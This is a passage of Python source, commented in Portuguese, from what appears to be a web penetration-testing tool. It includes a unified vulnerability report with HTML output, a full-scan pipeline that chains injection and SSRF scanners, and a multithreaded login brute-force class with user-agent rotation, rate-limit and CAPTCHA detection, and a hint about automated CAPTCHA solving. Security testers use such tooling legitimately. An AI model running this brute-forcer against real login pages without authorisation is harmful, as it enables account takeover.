            console.print(f"[bold yellow][-] Nenhuma CVE encontrada que corresponda ao critério de CVSS >= {min_cvss}.[/bold yellow]")
        console.print("-" * 60)
        
    return findings

# --- MÓDULO 21: UNIFIED FULL SCAN ---

class UnifiedReport:
    """Classe para consolidar e apresentar os resultados de múltiplos scanners."""

    def __init__(self, url):
        self.url = url
        self.all_findings = []
        self.tech_findings = {}
        self.cve_findings = []

    def add_findings(self, findings):
        if findings:
            self.all_findings.extend(findings)
            
    def add_cve_findings(self, findings):
        if findings:
            self.cve_findings.extend(findings)

    def present_report(self, output_file=None):
        """Apresenta um relatório unificado de todas as descobertas na consola ou em HTML."""
        if output_file:
            self.generate_html_report(output_file)
        else:
            self.present_console_report()

    def present_console_report(self):
        """Apresenta o relatório na consola."""
        console.print(Panel(f"[bold]Relatório de Análise de Segurança para: {self.url}[/bold]", style="bold white on blue", expand=False))

        if not self.all_findings and not self.cve_findings:
            console.print("\n[bold green]✅ Nenhuma vulnerabilidade ou má configuração crítica foi encontrada.[/bold green]")
            console.print("=" * 80)
            return

        if self.cve_findings:
            console.print("\n[bold]Vulnerabilidades Conhecidas (CVEs) Encontradas[/bold]")
            cve_table = Table(title="CVEs por Tecnologia")
            cve_table.add_column("Produto", style="cyan")
            cve_table.add_column("Versão", style="cyan")
            cve_table.add_column("CVE ID", style="yellow")
            cve_table.add_column("CVSS", style="magenta")
            cve_table.add_column("Data", style="blue")
            cve_table.add_column("Resumo", style="white")
            for f in sorted(self.cve_findings, key=lambda x: (x.get('Produto'), float(x.get('CVSS', 0) or 0)), reverse=True):
                cvss = f.get('CVSS', 0.0)
                if cvss is None: cvss = 0.0
                risk_color = "red" if cvss >= 7.0 else "yellow" if cvss >= 4.0 else "green"
                cve_id = f.get('ID')
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                cve_id_text = Text(cve_id, style=f"link {link}")
                cve_table.add_row(f.get("Produto"), f.get("Versão"), cve_id_text, f"[{risk_color}]{cvss:.1f}[/{risk_color}]", f.get("Data"), f.get("Resumo"))
            console.print(cve_table)
            console.print("-" * 80)

        if self.all_findings:
            console.print("\n[bold]Resultados da Análise de Vulnerabilidades[/bold]")
            risk_order = {"Crítico": 0, "Alto": 1, "Médio": 2, "Baixo": 3}
            sorted_findings = sorted(self.all_findings, key=lambda x: risk_order.get(x["Risco"], 99))
            
            table = Table(title="Resultados Consolidados")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo de Vulnerabilidade", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")

            risk_styles = {"Crítico": "bold white on red", "Alto": "bold red", "Médio": "bold yellow", "Baixo": "bold green"}

            for f in sorted_findings:
                risk = f.get("Risco", "Info")
                style = risk_styles.get(risk, "white")
                table.add_row(f"[{style}]{risk}[/{style}]", f.get("Tipo"), f.get("Detalhe"), f.get("Recomendação"))
                
            console.print(table)
        
        console.print("=" * 80)

    def generate_html_report(self, filename):
        """Gera um relatório HTML com os resultados."""
        html = f"""
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Relatório de Segurança para {self.url}</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; background-color: #f0f2f5; color: #1c1e21; }}
                .container {{ max-width: 1200px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                h1, h2 {{ color: #1c1e21; border-bottom: 2px solid #1877f2; padding-bottom: 10px; }}
                h1 {{ font-size: 2em; }}
                h2 {{ font-size: 1.5em; margin-top: 30px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th, td {{ padding: 12px 15px; border: 1px solid #ddd; text-align: left; word-break: break-word; }}
                th {{ background-color: #1877f2; color: white; font-weight: bold; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
                .risco-Crítico {{ background-color: #be2525; color: white; font-weight: bold; }}
                .risco-Alto {{ background-color: #fa5805; color: white; font-weight: bold; }}
                .risco-Médio {{ background-color: #ffc300; color: #333; }}
                .risco-Baixo {{ background-color: #5cb85c; color: white; }}
                .cvss-high {{ color: #be2525; font-weight: bold; }}
                .cvss-medium {{ color: #f0ad4e; font-weight: bold; }}
                .cvss-low {{ color: #5cb85c; }}
                a {{ color: #1877f2; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                p {{ line-height: 1.6; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Relatório de Análise de Segurança</h1>
                <p><strong>Alvo:</strong> {self.url}</p>
                <p><strong>Data:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                
                <h2>Tecnologias Detectadas</h2>
                <table>
                    <tr><th>Categoria</th><th>Tecnologia(s)</th></tr>
        """
        tech_found = False
        if self.tech_findings:
            for category, techs in self.tech_findings.items():
                if techs:
                    tech_found = True
                    html += f"<tr><td>{category}</td><td>{', '.join(techs)}</td></tr>"
        if not tech_found:
             html += "<tr><td colspan='2'>Nenhuma tecnologia específica detectada.</td></tr>"
        html += "</table>"

        if self.cve_findings:
            html += "<h2>Vulnerabilidades Conhecidas (CVEs)</h2><table><tr><th>Produto</th><th>Versão</th><th>CVE ID</th><th>CVSS</th><th>Data</th><th>Resumo</th></tr>"
            for f in sorted(self.cve_findings, key=lambda x: (x.get('Produto'), float(x.get('CVSS', 0) or 0)), reverse=True):
                cvss = f.get('CVSS', 0.0)
                if cvss is None: cvss = 0.0
                cvss_class = "cvss-high" if cvss >= 7.0 else "cvss-medium" if cvss >= 4.0 else "cvss-low"
                cve_id = f.get('ID')
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                html += f"<tr><td>{f.get('Produto')}</td><td>{f.get('Versão')}</td><td><a href='{link}' target='_blank'>{cve_id}</a></td><td class='{cvss_class}'>{cvss:.1f}</td><td>{f.get('Data')}</td><td>{f.get('Resumo')}</td></tr>"
            html += "</table>"

        html += "<h2>Resultados da Análise de Vulnerabilidades</h2>"
        if not self.all_findings:
            html += "<p>Nenhuma vulnerabilidade encontrada na análise.</p>"
        else:
            html += "<table><tr><th>Risco</th><th>Tipo</th><th>Detalhe</th><th>Recomendação</th></tr>"
            risk_order = {"Crítico": 0, "Alto": 1, "Médio": 2, "Baixo": 3}
            sorted_findings = sorted(self.all_findings, key=lambda x: risk_order.get(x["Risco"], 99))
            for f in sorted_findings:
                risk = f.get("Risco", "Info")
                html += f"""
                    <tr>
                        <td class="risco-{risk}">{risk}</td>
                        <td>{f.get("Tipo")}</td>
                        <td>{f.get("Detalhe")}</td>
                        <td>{f.get("Recomendação")}</td>
                    </tr>
                """
            html += "</table>"
        
        html += "</div></body></html>"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)
            console.print(f"\n[bold green]✅ Relatório HTML salvo em: {filename}[/bold green]")
        except IOError as e:
            console.print(f"\n[bold red][!] Erro ao salvar o relatório HTML: {e}[/bold red]")


def full_scan(url, output_file=None, min_cvss=0.0, no_cache=False):
    """Executa uma bateria de testes e apresenta um relatório unificado."""
    report = UnifiedReport(url)
    
    console.print("[bold blue]Iniciando análise completa...[/bold blue]")

    # Fase 1: Reconhecimento
    console.print("\n[bold]--- Fase 1: Reconhecimento e Análise de Configuração ---[/bold]")
    with console.status("[bold green]Detectando tecnologias...[/bold green]"):
        report.tech_findings = detect_technologies(url, return_findings=True)
    console.print("[bold green]✓ Detecção de tecnologias concluída.[/bold green]")

    # Fase 2: Análise de CVEs
    console.print("\n[bold]--- Fase 2: Análise de Vulnerabilidades Conhecidas (CVEs) ---[/bold]")
    all_techs = [tech for tech_list in report.tech_findings.values() for tech in tech_list]
    parsed_techs = set()
    for tech_str in all_techs:
        # Tenta extrair 'produto/versão' (ex: Apache/2.4.41) ou 'produto versão' (ex: WordPress 5.8.1)
        # Regex melhorado para capturar mais variações
        match = re.search(r'([\w.-]+)(?:/|[\s-]?v| version )([\d][\d.]*[\d]?)', tech_str, re.IGNORECASE)
        if match:
            product, version = match.groups()
            product = product.lower().replace(' ', '-')
            parsed_techs.add((product, version))
        else: # Caso especial para tags meta generator sem versão explícita
             match_gen = re.search(r'([\w\s]+)\s+([\d.]+)', tech_str)
             if match_gen:
                product, version = match_gen.groups()
                product = product.strip().lower().replace(' ', '-')
                parsed_techs.add((product, version))


    if parsed_techs:
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
            task = progress.add_task("[green]Verificando CVEs...", total=len(parsed_techs))
            for product, version in parsed_techs:
                progress.update(task, advance=1, description=f"Verificando CVEs para {product} v{version}")
                cve_findings = cve_scan(product, version, min_cvss=min_cvss, no_cache=no_cache, return_findings=True)
                report.add_cve_findings(cve_findings)
        console.print(f"[bold green]✓ Análise de CVEs concluída. Encontradas {len(report.cve_findings)} CVEs correspondentes.[/bold green]")
    else:
        console.print("[yellow]Nenhuma tecnologia com versão foi identificada para a busca de CVEs.[/yellow]")

    # Fase 3: Scanning de Vulnerabilidades Ativas
    console.print("\n[bold]--- Fase 3: Scanning de Vulnerabilidades Ativas ---[/bold]")
    scanner_classes = {
        "Configurações Gerais": VulnerabilityScanner,
        "SQL Injection": SQLiScanner,
        "Cross-Site Scripting": XSSScanner,
        "Command Injection": CommandInjectionScanner,
        "Local File Inclusion": LFIScanner,
        "Server-Side Request Forgery": SSRFScanner,
        "Open Redirect": OpenRedirectScanner
    }
    
    for name, scanner_class in scanner_classes.items():
        console.print(f"[*] Executando scanner de [bold cyan]{name}[/bold cyan]...")
        scanner = scanner_class(url)
        findings = scanner.run_scan(return_findings=True)
        report.add_findings(findings)
        console.print(f"[bold green]✓ Scanner de {name} concluído.[/bold green]")

    # Fase 4: Geração do Relatório Final
    console.print("\n[bold]--- Fase 4: Geração do Relatório Final ---[/bold]")
    report.present_report(output_file)

# --- MÓDULO 22: VISUALIZADOR DE ARQUIVOS POR URL ---

def view_file_from_url(url):
    """Baixa e exibe o conteúdo de um arquivo a partir de um URL."""
    console.print("-" * 60)
    console.print(f"[*] Visualizando arquivo de: [bold cyan]{url}[/bold cyan]")
    console.print("-" * 60)

    try:
        with console.status("[bold green]Baixando o arquivo...[/bold green]"):
            response = requests.get(url, timeout=15, stream=True, verify=False)
            response.raise_for_status()

        content_type = response.headers.get('Content-Type', '').lower()
        content_length = response.headers.get('Content-Length')

        console.print(f"[bold]Tipo de Conteúdo:[/bold] {content_type}")
        if content_length:
            try:
                size_kb = int(content_length) / 1024
                console.print(f"[bold]Tamanho do Arquivo:[/bold] {size_kb:.2f} KB")
            except (ValueError, TypeError):
                console.print(f"[bold]Tamanho do Arquivo:[/bold] {content_length}")
        
        console.print("-" * 60)

        if any(t in content_type for t in ['text', 'json', 'xml', 'javascript', 'css']):
            text_content = response.text
            console.print(f"[bold green]Conteúdo do Arquivo (Texto):[/bold green]")
            
            syntax_lexer = "default"
            if 'html' in content_type: syntax_lexer = 'html'
            elif 'json' in content_type: syntax_lexer = 'json'
            elif 'css' in content_type: syntax_lexer = 'css'
            elif 'javascript' in content_type: syntax_lexer = 'javascript'
            elif url.endswith('.py'): syntax_lexer = 'python'
            elif url.endswith('.xml'): syntax_lexer = 'xml'
            
            if len(text_content) > 5000:
                 console.print("[yellow]O arquivo é muito grande. Exibindo os primeiros 5000 caracteres.[/yellow]")
                 text_content = text_content[:5000]

            syntax = Syntax(text_content, syntax_lexer, theme="monokai", line_numbers=True)
            console.print(syntax)

        elif 'image' in content_type:
            console.print("[bold yellow]Arquivo é uma imagem.[/bold yellow]")
            console.print("Visualizar o conteúdo de imagens no terminal não é suportado.")
            console.print("Use o comando 'meta' para tentar extrair metadados EXIF se for uma JPEG.")
            try:
                img_content = response.content
                img = Image.open(BytesIO(img_content))
                console.print(f"[bold]Formato da Imagem:[/bold] {img.format}")
                console.print(f"[bold]Dimensões:[/bold] {img.size[0]}x{img.size[1]} pixels")
                console.print(f"[bold]Modo:[/bold] {img.mode}")
            except Exception as e:
                console.print(f"[red]Não foi possível analisar os detalhes da imagem: {e}[/red]")

        else:
            console.print("[bold yellow]O tipo de arquivo não é texto e não pode ser exibido diretamente.[/bold yellow]")
            console.print("O arquivo foi identificado como binário.")

    except requests.exceptions.HTTPError as e:
        console.print(f"[bold red][!] Erro HTTP: {e.response.status_code} {e.response.reason}[/bold red]")
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][!] Erro ao acessar a URL: {e}[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    finally:
        console.print("-" * 60)

# --- MÓDULO 23: SCANNER DE FORÇA BRUTA (REFATORADO) ---

class BruteForceScanner:
    """Scanner para realizar ataques de força bruta em formulários de login."""
    def __init__(self, url, user_field='username', pass_field='password', users=None, pass_wordlist_path=None,
                 failure_string=None, success_string=None, workers=5, delay=1.0, attack_mode='battering_ram',
                 max_retries=3, backoff_factor=2.0, session_pool_size=10, enable_logging=False):
        # Normaliza URL
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        self.url = url
        self.user_field = user_field
        self.pass_field = pass_field
        self.users = users or []
        self.pass_wordlist_path = pass_wordlist_path
        self.failure_string = failure_string
        self.success_string = success_string
        self.workers = workers
        self.delay = delay
        self.attack_mode = attack_mode
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.session_pool_size = session_pool_size
        self.enable_logging = enable_logging
        
        # Configuração de sessão pool
        self.session_pool = []
        for i in range(session_pool_size):
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            self.session_pool.append(session)
        
        # Armazenamento de resultados
        self.findings = []
        self.statistics = {
            'total_attempts': 0,
            'successful_attempts': 0,
            'failed_attempts': 0,
            'captcha_detected': 0,
            'rate_limited': 0,
            'timeouts': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Controle de threads
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._session_lock = threading.Lock()
        self._session_index = 0
        
        # User agents para rotação
        self._user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        # Padrões de detecção
        self.captcha_patterns = [
            r'captcha', r'recaptcha', r'g-recaptcha', r'hcaptcha', r'cloudflare',
            r'verify.*human', r'anti.*bot', r'security.*check', r'robot.*check'
        ]
        
        self.rate_limit_patterns = [
            r'too.*many.*requests', r'rate.*limit', r'temporarily.*blocked',
            r'retry.*later', r'slow.*down', r'flood.*protection', r'abuse.*detected'
        ]
        
        self.success_indicators = [
            r'welcome', r'dashboard', r'profile', r'logout', r'admin.*panel',
            r'member.*area', r'user.*panel', r'home.*page', r'main.*menu'
        ]
        
        self.failure_indicators = [
            r'invalid.*credentials', r'wrong.*password', r'incorrect.*username',
            r'login.*failed', r'authentication.*failed', r'access.*denied',
            r'unauthorized', r'forbidden', r'error.*login'
        ]
        
        # Logging setup
        if self.enable_logging:
            import logging
            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
            self.logger = logging.getLogger(__name__)
        else:
            self.logger = None

    def _get_session(self):
        """Obtém uma sessão do pool de forma thread-safe."""
        with self._session_lock:
            session = self.session_pool[self._session_index]
            self._session_index = (self._session_index + 1) % len(self.session_pool)
            return session
    
    def _log(self, message, level='info'):
        """Log message if logging is enabled."""
        if self.logger:
            getattr(self.logger, level)(message)
    
    def _detect_captcha(self, response_text):
        """Detecta presença de CAPTCHA na resposta."""
        response_lower = response_text.lower()
        for pattern in self.captcha_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        return False
    
    def _detect_rate_limiting(self, response):
        """Detecta se houve rate limiting."""
        if response.status_code == 429:
            return True
        
        response_lower = response.text.lower()
        for pattern in self.rate_limit_patterns:
            if re.search(pattern, response_lower, re.IGNORECASE):
                return True
        return False
    
    def _enhanced_success_detection(self, response, username, password):
        """Detecção aprimorada de login bem-sucedido."""
        # Verifica string de sucesso definida pelo usuário
        if self.success_string and self.success_string in response.text:
            return True
        
        # Verifica string de falha definida pelo usuário
        if self.failure_string and self.failure_string not in response.text:
            return True
        
        # Heurísticas baseadas em padrões comuns
        response_lower = response.text.lower()
        
        # Verifica indicadores de sucesso
        success_score = 0
        for pattern in self.success_indicators:
            if re.search(pattern, response_lower, re.IGNORECASE):
                success_score += 1
        
        # Verifica indicadores de falha
        failure_score = 0
        for pattern in self.failure_indicators:
            if re.search(pattern, response_lower, re.IGNORECASE):
                failure_score += 1
        
        # Verifica redirecionamentos (indicativo de sucesso)
        if len(response.history) > 0:
            success_score += 2
        
        # Verifica tamanho da resposta (respostas de sucesso tendem a ser maiores)
        if len(response.content) > 1000:
            success_score += 1
        
        # Verifica status codes
        if response.status_code in [200, 302, 301]:
            success_score += 1
        
        # Decisão baseada em score
        return success_score > failure_score and success_score >= 2
    
    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona uma descoberta à lista de resultados."""
        finding = {
            "Risco": risk,
            "Tipo": v_type,
            "Detalhe": detail,
            "Recomendação": recommendation
        }
        self.findings.append(finding)
        self._log(f"Finding added: {v_type} - {detail}")
    
    def _load_wordlist(self, file_path):
        """Carrega wordlist de um arquivo."""
        try:
            with open(file_path, 'r', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"[bold red][!] Arquivo de wordlist não encontrado: {file_path}[/bold red]")
            return []
        except Exception as e:
            console.print(f"[bold red][!] Erro ao ler wordlist: {e}[/bold red]")
            return []

    def _get_login_form(self):
        """Obtém detalhes do formulário de login com retry logic."""
        session = self._get_session()
        
        for attempt in range(self.max_retries):
            try:
                self._log(f"Attempting to fetch login form (attempt {attempt + 1}/{self.max_retries})")
                response = session.get(self.url, verify=False, timeout=10)
                
                # Verifica se há CAPTCHA
                if self._detect_captcha(response.text):
                    self.statistics['captcha_detected'] += 1
                    self._log("CAPTCHA detected on login form", 'warning')
                    self._add_finding("Médio", "CAPTCHA Detectado", 
                                    "Formulário de login possui CAPTCHA", 
                                    "Considere desabilitar CAPTCHA para testes ou use soluções automatizadas")
                
                soup = BeautifulSoup(response.content, 'html.parser')
                break
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                self.statistics['timeouts'] += 1
                if attempt < self.max_retries - 1:
                    wait_time = self.backoff_factor ** attempt
                    self._log(f"Connection error, retrying in {wait_time}s: {e}", 'warning')
                    time.sleep(wait_time)
                    continue
                else:
                    self._log(f"Failed to connect after {self.max_retries} attempts: {e}", 'error')
                    console.print(f"[bold red][!] Erro de conexão: {e}[/bold red]")
                    return None, None, None, None
        
        try:
            # Busca formulário com campos de login
            form = None
            for f in soup.find_all('form'):
                if f.find('input', {'name': self.user_field}) and f.find('input', {'name': self.pass_field}):
                    form = f
                    break
            
            if not form:
                self._log(f"Login form not found with fields '{self.user_field}' and '{self.pass_field}'", 'error')
                console.print(f"[bold red][!] Formulário não encontrado com campos '{self.user_field}' e '{self.pass_field}'[/bold red]")
                return None, None, None, None

            action_url = urljoin(self.url, form.get('action', self.url))
            method = form.get('method', 'post').lower()
            
            # Extrai todos os campos do formulário
            form_data = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                if name:
                    form_data[name] = value
            
            # Extrai cookies de sessão
            cookies = session.cookies.get_dict()
            
            self._log(f"Form found: {action_url} ({method.upper()})")
            self._log(f"Form data fields: {list(form_data.keys())}")
            
            return action_url, method, form_data, cookies
        except Exception as e:
            self._log(f"Error parsing form: {e}", 'error')
            console.print(f"[bold red][!] Erro ao analisar formulário: {e}[/bold red]")
            return None, None, None, None

    def _test_credential(self, username, password, action_url, method, form_data, cookies):
        """Testa um par de credenciais com retry logic aprimorado."""
        if self._stop_event.is_set():
            return None

        # Delay entre tentativas
        if self.delay > 0:
            import random
            time.sleep(self.delay + random.uniform(0, 0.5))

        session = self._get_session()
        
        for attempt in range(self.max_retries):
            try:
                self.statistics['total_attempts'] += 1
                
                # Prepara payload
                payload = form_data.copy()
                payload[self.user_field] = username
                payload[self.pass_field] = password
                
                # Headers realistas
                import random
                headers = {
                    'Referer': self.url,
                    'User-Agent': random.choice(self._user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                # Aplica cookies de sessão
                if cookies:
                    session.cookies.update(cookies)
                
                if method == 'post':
                    response = session.post(action_url, data=payload, headers=headers, 
                                          verify=False, timeout=10, allow_redirects=True)
                else:
                    response = session.get(action_url, params=payload, headers=headers, 
                                         verify=False, timeout=10, allow_redirects=True)
                
                # Verifica rate limiting
                if self._detect_rate_limiting(response):
                    self.statistics['rate_limited'] += 1
                    self._log(f"Rate limiting detected for {username}:{password}", 'warning')
                    # Aumenta delay para próximas tentativas
                    time.sleep(self.delay * 2)
                    continue
                
                # Verifica CAPTCHA
                if self._detect_captcha(response.text):
                    self.statistics['captcha_detected'] += 1
                    self._log(f"CAPTCHA detected for {username}:{password}", 'warning')
                    return 'captcha'
                
                # Análise da resposta com detecção aprimorada
                success = self._enhanced_success_detection(response, username, password)
                
                if success:
                    self.statistics['successful_attempts'] += 1
                    self._log(f"Successful login found: {username}:{password}")
                    with self._lock:
                        if not self._stop_event.is_set():
                            self._stop_event.set()
                            return (username, password)
                else:
                    self.statistics['failed_attempts'] += 1
                    self._log(f"Failed login attempt: {username}:{password}", 'debug')
                
                break
                
            except requests.RequestException as e:
                self.statistics['timeouts'] += 1
                if attempt < self.max_retries - 1:
                    wait_time = self.backoff_factor ** attempt
                    self._log(f"Request failed, retrying in {wait_time}s: {e}", 'warning')
                    time.sleep(wait_time)
                    continue
                else:
                    self._log(f"Request failed after {self.max_retries} attempts: {e}", 'error')
                    break
        
        return None

    def _generate_credential_tasks(self, passwords):
        """Gera lista de tarefas baseada no modo de ataque."""
        tasks = []
        
        if self.attack_mode == 'battering_ram':
            # Um usuário, múltiplas senhas
            if self.users:
                username = self.users[0]
                tasks = [(username, p) for p in passwords]
        elif self.attack_mode == 'pitchfork':
            # Pares usuario:senha
            tasks = [(u.split(':', 1)[0], u.split(':', 1)[1]) for u in self.users if ':' in u]
        elif self.attack_mode == 'cluster_bomb':
            # Todos os usuários vs todas as senhas
            tasks = list(itertools.product(self.users, passwords))
        
        return tasks
    
    def run_scan(self, return_findings=False):
        """Executa o ataque de força bruta."""
        console.print("-" * 60)
        console.print(f"[*] Iniciando ataque de força bruta em: [bold cyan]{self.url}[/bold cyan]")
        console.print(f"[*] Modo de Ataque: [bold yellow]{self.attack_mode}[/bold yellow]")
        if self.success_string:
            console.print(f"[*] String de sucesso: [green]'{self.success_string}'[/green]")
        if self.failure_string:
            console.print(f"[*] String de falha: [red]'{self.failure_string}'[/red]")
        console.print("-" * 60)

        # Carrega wordlist
        if not self.pass_wordlist_path:
            console.print("[bold red][!] Wordlist não especificada[/bold red]")
            return self.findings if return_findings else None
            
        passwords = self._load_wordlist(self.pass_wordlist_path)
        if not passwords:
            console.print("[bold red][!] Nenhuma senha carregada[/bold red]")
            return self.findings if return_findings else None
        
        # Gera tarefas
        tasks = self._generate_credential_tasks(passwords)
        if not tasks:
            console.print("[bold red][!] Nenhuma tarefa gerada[/bold red]")
            return self.findings if return_findings else None

        # Obtém formulário
        action_url, method, form_data, cookies = self._get_login_form()
        if not action_url:
            return self.findings if return_findings else None

        console.print(f"[*] Formulário encontrado: [cyan]{action_url}[/cyan] ([cyan]{method.upper()}[/cyan])")
        console.print(f"[*] Testando {len(tasks)} combinações de credenciais...")

        # Executa teste
        found_credential = None
        captcha_blocked = False
        
        # Para garantir que o delay seja respeitado, vamos controlar as submissões
        if self.workers == 1:
            # Modo sequencial: uma tentativa por vez respeitando o delay
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}"),
                BarColumn(bar_width=40),
                "[progress.percentage]{task.percentage:>3.1f}%",
                "|",
                TextColumn("[bold green]{task.completed}[/bold green]/[bold cyan]{task.total}[/bold cyan]"),
                "|",
                TextColumn("[yellow]{task.fields[current_combo]}[/yellow]"),
                "|",
                TextColumn("[red]Falhas: {task.fields[failures]}[/red]"),
                "|",
                TimeRemainingColumn(),
                console=console,
                transient=return_findings
            ) as progress:
                task_id = progress.add_task(
                    "[bold cyan]Testando credenciais sequencialmente...",
                    total=len(tasks),
                    current_combo="Iniciando...",
                    failures=0
                )
                
                for i, (user, pwd) in enumerate(tasks):
                    if self._stop_event.is_set():
                        break
                    
                    current_attempt = f"{user}:{pwd[:3]}{'*' * max(0, len(pwd) - 3)}"
                    progress.update(task_id, current_combo=f"Testando {current_attempt}")
                    
                    result = self._test_credential(user, pwd, action_url, method, form_data, cookies)
                    
                    if result == 'captcha':
                        captcha_blocked = True
                        self._log("CAPTCHA blocking detected, stopping attack", 'warning')
                        progress.update(task_id, current_combo="[red]CAPTCHA detectado![/red]")
                        break
                    elif result:
                        found_credential = result
                        progress.update(task_id, current_combo=f"[bold green]✓ {current_attempt}[/bold green]")
                        break
                    else:
                        self.statistics['failed_attempts'] += 1
                        progress.update(
                            task_id, 
                            advance=1,
                            current_combo=current_attempt,
                            failures=self.statistics['failed_attempts']
                        )
        else:
            # Modo paralelo: múltiplas tentativas simultâneas (delay menos preciso)
            with ThreadPoolExecutor(max_workers=self.workers) as executor:
                future_to_cred = {executor.submit(self._test_credential, user, pwd, action_url, method, form_data, cookies): (user, pwd) for user, pwd in tasks}
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[bold blue]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.1f}%",
                    "|",
                    TextColumn("[bold green]{task.completed}[/bold green]/[bold cyan]{task.total}[/bold cyan]"),
                    "|",
                    TextColumn("[yellow]{task.fields[current_combo]}[/yellow]"),
                    "|",
                    TextColumn("[red]Falhas: {task.fields[failures]}[/red]"),
                    "|",
                    TimeRemainingColumn(),
                    console=console,
                    transient=return_findings
                ) as progress:
                    task_id = progress.add_task(
                        "[bold cyan]Testando credenciais em paralelo...",
                        total=len(tasks),
                        current_combo="Iniciando...",
                        failures=0
                    )
                
                for future in as_completed(future_to_cred):
                    if self._stop_event.is_set():
                        # Cancela tarefas pendentes
                        for f in future_to_cred:
                            f.cancel()
                        break
                    
                    try:
                        result = future.result(timeout=1)
                        cred = future_to_cred[future]
                        current_attempt = f"{cred[0]}:{cred[1][:3]}{'*' * max(0, len(cred[1]) - 3)}"
                        
                        if result == 'captcha':
                            captcha_blocked = True
                            self._log("CAPTCHA blocking detected, stopping attack", 'warning')
                            progress.update(task_id, current_combo="[red]CAPTCHA detectado![/red]")
                            for f in future_to_cred:
                                if not f.done():
                                    f.cancel()
                            break
                        elif result:
                            found_credential = result
                            progress.update(task_id, current_combo=f"[bold green]✓ {current_attempt}[/bold green]")
                            # Cancela tarefas pendentes
                            for f in future_to_cred:
                                if not f.done():
                                    f.cancel()
                            break
                        else:
                            self.statistics['failed_attempts'] += 1
                            progress.update(
                                task_id, 
                                advance=1,
                                current_combo=current_attempt,
                                failures=self.statistics['failed_attempts']
                            )
                        
                    except (concurrent.futures.TimeoutError, Exception):
                        cred = future_to_cred[future]
                        current_attempt = f"{cred[0]}:{cred[1][:3]}{'*' * max(0, len(cred[1]) - 3)}"
                        self.statistics['failed_attempts'] += 1
                        progress.update(
                            task_id, 
                            advance=1,
                            current_combo=f"[red]Timeout: {current_attempt}[/red]",
                            failures=self.statistics['failed_attempts']
                        )

        # Processa resultados
        if found_credential:
            self._add_finding("Alto", "Credencial Válida Encontrada", 
                            f"Usuário: {found_credential[0]}, Senha: {found_credential[1]}", 
                            "Alterar credenciais padrão e implementar políticas de senha forte")
        
        if not return_findings:
            self._present_findings()
        
        return self.findings if return_findings else None
    
    def _present_findings(self):
        """Apresenta os resultados encontrados."""
        console.print("-" * 60)
        
        if self.findings:
            console.print("[bold green on black] ✅ CREDENCIAL ENCONTRADA! ✅ [/bold green on black]")
            
            table = Table(title="Resultados do Brute Force")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")
            
            for finding in self.findings:
                table.add_row(finding["Risco"], finding["Tipo"], finding["Detalhe"], finding["Recomendação"])
            
            console.print(table)
        else:
            console.print("[bold yellow][-] Nenhuma credencial válida encontrada[/bold yellow]")
        
        console.print("-" * 60)

def validate_brute_force_args(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
                              failure_string, success_string, workers, delay, attack_mode, max_retries,
                              backoff_factor, session_pool_size):
    """Valida argumentos do brute force e fornece feedback detalhado."""
    errors = []
    warnings = []
    
    # Validação de URL
    if not url:
        errors.append("URL é obrigatória")
    elif not url.startswith(('http://', 'https://')):
        warnings.append(f"URL '{url}' não possui protocolo, assumindo http://")
    
    # Validação de campos do formulário
    if not user_field or not user_field.strip():
        errors.append("Campo de usuário (--user-field) é obrigatório")
    if not pass_field or not pass_field.strip():
